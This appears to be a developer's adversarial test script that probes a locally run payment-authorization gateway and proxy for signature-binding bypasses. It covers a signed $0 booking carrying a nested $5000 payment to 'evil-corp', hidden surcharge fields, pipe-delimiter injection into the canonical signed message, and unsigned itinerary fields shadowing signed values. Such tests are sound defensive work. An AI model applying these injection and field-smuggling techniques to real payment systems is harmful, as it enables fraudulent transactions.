// attack3 — adversarial pass against the 0.4.2 / 0.3.3 / 0.7.7 release itself.
import crypto from 'node:crypto';
import { newAgent, sign, authorize, buildAuthMessageLegacy } from './agent.mjs';
const GW='http://127.0.0.1:4401', API='http://127.0.0.1:4402', PROXY='http://127.0.0.1:4405', UP='http://127.0.0.1:4403';
const agent=newAgent();
const reset=async()=>{await fetch(API+'/__reset');await fetch(UP+'/__reset',{method:'POST'});};
const upCalls=async()=>(await (await fetch(UP+'/__calls')).json());
async function send(base,path,signed,body,ct='application/json'){
  const h={'content-type':ct}; if(signed)h['x-magp-request']=JSON.stringify(signed);
  const r=await fetch(base+path,{method:'POST',headers:h,body});
  let t=await r.text(); let j=null; try{j=JSON.parse(t)}catch{}
  return {status:r.status, text:t, body:j};
}
const line=(t)=>console.log('\n=== '+t+' ===');

// N1 — sign a $0 action, execute an arbitrary nested amount.
// isMeaningfulSignedValue('amount', 0) === false, so the binder never REQUIRES amount in the
// body; merchant alone is required, and a matching top-level merchant satisfies it.
line('N1  signed amount:0 + matching merchant -> nested $5000 rides free (proxy, deny+requireAuth ON)');
for (const [name, signedAmt, body] of [
  ['signed $0, body {merchant, booking:{amount:5000}}',      0, {merchant:'skyward-air', booking:{amount:5000, payee:'evil-corp'}}],
  ['signed $0, body {merchant, total:5000}',                 0, {merchant:'skyward-air', total:5000}],
  ['signed $0, body {merchant, Amount:5000}',                0, {merchant:'skyward-air', Amount:5000}],
]){
  await reset();
  const a=await authorize(API,agent,{action:'book-flight',amount:signedAmt,merchant:'skyward-air'});
  if(!a.authorizationId){ console.log(`  issuer refused to authorize $${signedAmt}: ${a.reasonCode}`); continue; }
  const s=sign(agent,{action:'book-flight',amount:signedAmt,merchant:'skyward-air',authorizationId:a.authorizationId});
  const r=await send(PROXY,'/book-flight',s,JSON.stringify(body));
  const c=await upCalls();
  const bad = c.length>0;
  console.log(`${bad?'*** BYPASS':'  blocked '}  ${name}\n      proxy=${r.status} ${r.body?.reasonCode??'FORWARDED'}  upstream got: ${c.length?c[0].body:'(nothing)'}`);
}

// N1b — same on the scaffold gateway (bookFlight() actually runs)
line('N1b same shape on the SCAFFOLD gateway');
{ await reset();
  const a=await authorize(API,agent,{action:'book-flight',amount:0,merchant:'skyward-air'});
  const s=sign(agent,{action:'book-flight',amount:0,merchant:'skyward-air',authorizationId:a.authorizationId});
  const r=await send(GW,'/book-flight',s,JSON.stringify({merchant:'skyward-air',booking:{amount:5000,payee:'evil-corp'}}));
  console.log(`  ${r.status===200?'*** BYPASS':'blocked'}: ${r.status} bookFlight ran with -> ${r.text.slice(0,160)}`); }

// N2 — additive hidden field: both required fields present and matching, extra value alongside
line('N2  required fields match, an EXTRA value field rides along verbatim');
{ await reset();
  const a=await authorize(API,agent,{action:'book-flight',amount:250,merchant:'skyward-air'});
  const s=sign(agent,{action:'book-flight',amount:250,merchant:'skyward-air',authorizationId:a.authorizationId});
  const r=await send(PROXY,'/book-flight',s,JSON.stringify({amount:250,currency:'USD',merchant:'skyward-air',extras:{surcharge:4750,payee:'evil-corp'}}));
  const c=await upCalls();
  console.log(`  proxy=${r.status}; upstream got: ${c.length?c[0].body:'(nothing)'}\n  ${c.length&&/4750/.test(c[0].body)?'*** hidden surcharge forwarded (binder governs only amount/currency/merchant)':'blocked'}`); }

// N3 — delimiter injection: does 0.3.3's escaping stop a "|" in merchant shifting fields?
line('N3  delimiter injection in the canonical message (0.3.3 escaping)');
{ const evil = 'skyward-air|book-flight|5000';
  const legacyA = buildAuthMessageLegacy({agentDid:'did:x',action:'book-flight',amount:250,currency:'USD',merchant:evil,nonce:'n',issuedAt:'t'});
  const legacyB = buildAuthMessageLegacy({agentDid:'did:x',action:'book-flight',amount:250,currency:'USD|skyward-air',merchant:'book-flight|5000',nonce:'n',issuedAt:'t'});
  console.log(`  pre-0.3.3 canonicalization collides: ${legacyA===legacyB ? '*** YES — two different field sets, one signed message' : 'no'}`);
  const { buildAuthMessage } = await import('./agent.mjs');
  const newA = buildAuthMessage({agentDid:'did:x',action:'book-flight',amount:250,currency:'USD',merchant:evil,nonce:'n',issuedAt:'t'});
  const newB = buildAuthMessage({agentDid:'did:x',action:'book-flight',amount:250,currency:'USD|skyward-air',merchant:'book-flight|5000',nonce:'n',issuedAt:'t'});
  console.log(`  0.3.3 escaped canonicalization collides: ${newA===newB ? '*** YES' : 'no — escaped, distinct'}`); }

// N4 — version skew: an agent still signing the PRE-0.3.3 message against a 0.3.3 gateway
line('N4  agent on pre-0.3.3 canonicalization vs 0.3.3 gateway (interop)');
{ await reset();
  const a=await authorize(API,agent,{action:'book-flight',amount:250,merchant:'skyward-air'});
  const s=sign(agent,{action:'book-flight',amount:250,merchant:'skyward-air',authorizationId:a.authorizationId,canon:buildAuthMessageLegacy});
  const r=await send(GW,'/book-flight',s,JSON.stringify({amount:250,currency:'USD',merchant:'skyward-air'}));
  console.log(`  plain merchant (no delimiter): ${r.status} ${r.body?.reasonCode??'EXECUTED'} ${r.status===200?'(messages identical when no | or \\\\ present — compatible)':''}`); }

// N5 — unsigned itinerary fields reaching the policy context
line('N5  itinerary (NOT covered by the signature) injected into the policy context');
{ await reset();
  const a=await authorize(API,agent,{action:'book-flight',amount:250,merchant:'skyward-air'});
  const s=sign(agent,{action:'book-flight',amount:250,merchant:'skyward-air',authorizationId:a.authorizationId});
  // try to shadow the governed values via itinerary — signed-last should win
  s.itinerary={ amount: 5000, 'mm:payAmount': 5000, merchant:'evil-corp', 'mm:merchant':'evil-corp', risk:'low' };
  const r=await send(GW,'/book-flight',s,JSON.stringify({amount:250,currency:'USD',merchant:'skyward-air'}));
  console.log(`  itinerary tries amount 5000/evil-corp: ${r.status} ${r.body?.reasonCode??'EXECUTED'} -> ${r.status===200?'executed at the SIGNED $250 (signed-last held)':'blocked'}`); }
